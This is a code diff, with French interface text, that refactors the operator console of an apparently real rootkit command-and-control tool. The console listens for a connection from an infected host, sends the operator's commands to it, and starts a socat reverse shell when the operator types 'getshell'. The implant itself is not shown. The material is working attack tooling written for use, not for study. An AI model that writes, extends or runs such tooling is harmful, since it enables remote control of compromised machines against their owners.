@@ -1,28 +1,27 @@
+import getpass
 import socket
 import threading
 import time
-import getpass
+import config as cfg
+from utils.socket import send_to_server, receive_from_server
+from utils.socat import run_socat_shell
 from prompt_toolkit import PromptSession
 from prompt_toolkit.patch_stdout import patch_stdout
 
-from utils.state import (
-    HOST, PORT, PASSWORD, command_history, connection_lock
-)
-from utils.socat_launcher import run_socat_shell
-from utils.socket_comm import send_to_server, receive_from_server
+# --------------------------------- CLI MODE --------------------------------- #
 
 def run_cli():
     print("🔐 Authentification requise pour le mode CLI")
     pwd = getpass.getpass("Mot de passe > ")
-    if pwd != PASSWORD:
+    if pwd != cfg.PASSWORD:
         print("❌ Mot de passe incorrect.")
         return
 
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_socket.bind((HOST, PORT))
+    server_socket.bind((cfg.HOST, cfg.PORT))
     server_socket.listen(1)
-    print(f"📡 [*] En attente de connexion sur {HOST}:{PORT}...")
+    print(f"📡 [*] En attente de connexion sur {cfg.HOST}:{cfg.PORT}...")
     connection, addr = server_socket.accept()
     print(f"✅ [+] Rootkit connecté depuis {addr[0]}")
 
@@ -37,7 +36,7 @@ def run_cli():
                     if line.lower() == "getshell":
                         threading.Thread(target=run_socat_shell).start()
                         time.sleep(1)
-                    command_history.append(line)
+                    cfg.command_history.append(line)
                     send_to_server(connection, line)
                     if line.lower() == "killcom":
                         print("❌ Fermeture demandée.")
@@ -51,7 +50,7 @@ def run_cli():
 
     def receive_responses():
         while True:
-            received = receive_from_server(connection)
+            received = receive_from_server(connection);
             print(f"🔒 [*] Received: {received}")
 
     threading.Thread(target=receive_responses, daemon=True).start()
